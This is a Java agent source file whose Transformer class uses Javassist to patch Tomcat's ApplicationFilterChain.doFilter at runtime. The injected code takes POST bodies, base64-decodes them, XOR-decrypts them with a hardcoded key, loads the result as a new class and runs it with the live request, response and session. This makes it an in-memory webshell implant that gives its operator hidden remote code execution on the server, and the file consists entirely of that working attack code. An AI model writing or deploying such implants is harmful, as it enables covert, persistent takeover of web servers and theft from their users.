
import javassist.*;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.reflect.Array;
import java.security.ProtectionDomain;
import java.util.Arrays;

public class Transformer implements ClassFileTransformer {
    public static final String CLASSNAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String METHODNAME = "doFilter";

    @Override
    public byte[] transform( ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        className = className.replace("/",".");
        if (className.equals(CLASSNAME)){
            ClassPool classPool = ClassPool.getDefault();
            System.out.println(classBeingRedefined.getName());
            ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined);
            classPool.insertClassPath(classClassPath);
            try {
                CtClass ctClass = classPool.get(className);
                CtMethod declaredMethod = ctClass.getDeclaredMethod(METHODNAME);
                String code =
                        "            java.util.Map obj = new java.util.HashMap();\n" +
                        "            javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest)request;\n" +
                        "            obj.put(\"request\",httpServletRequest);\n" +
                        "            obj.put(\"response\",response);\n" +
                        "            obj.put(\"session\",httpServletRequest.getSession());\n" +
                        "            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();\n"+
                        "            if (httpServletRequest.getMethod().equals(\"POST\")){\n" +
                        "                byte[] bytes = new byte[1024];\n" +
                        "                int read = httpServletRequest.getInputStream().read(bytes);\n" +
                        "                while ( read > 0 ){\n" +
                        "                    byte[] data = java.util.Arrays.copyOfRange(bytes, 0, read);\n" +
                        "                    byteArrayOutputStream.write(data);\n" +
                        "                    read = httpServletRequest.getInputStream().read(bytes);\n" +
                        "                }\n" +

                        "                try {\n" +
                        "                    sun.misc.BASE64Decoder base64Decoder = new sun.misc.BASE64Decoder();\n" +
                        "                    byte[] decodebs = base64Decoder.decodeBuffer(new String(byteArrayOutputStream.toByteArray()));\n" +
                        "                    String key=\"e45e329feb5d925b\";\n" +
                        "                    for (int i = 0; i < decodebs.length; i++) {\n" +
                        "                        decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));\n" +
                        "                    }\n" +

                                "ClassLoader loader=this.getClass().getClassLoader();\n"+
                                "java.lang.reflect.Method defineMethod = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n" +
                                "defineMethod.setAccessible(true);\n" +
                                "java.lang.reflect.Constructor constructor = java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n" +
                                "constructor.setAccessible(true);\n" +
                                "java.lang.ClassLoader cl = (java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n" +
                                "java.lang.Class  c = (java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(decodebs),null});\n" +
                                "c.newInstance().equals(obj);"+
                        "                } catch (NoSuchMethodException e) {\n" +
                        "                    e.printStackTrace();\n" +
                        "                } catch (java.lang.reflect.InvocationTargetException e) {\n" +
                        "                    \nSystem.out.println(111);" +
                        "                } catch (java.lang.IllegalAccessException e) {\n" +
                        "                    e.printStackTrace();\n" +
                        "                } catch (java.lang.InstantiationException e) {\n" +
                        "                    e.printStackTrace();\n" +
                        "                }\n" +
                        "            }";

                declaredMethod.insertBefore(code);
                byte[] bytes = ctClass.toBytecode();
                ctClass.detach();
                System.out.println("success!!!!!!");
                return bytes;
            } catch (NotFoundException e) {
                e.printStackTrace();
            } catch (CannotCompileException e) {
                e.printStackTrace();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        return null;
    }


}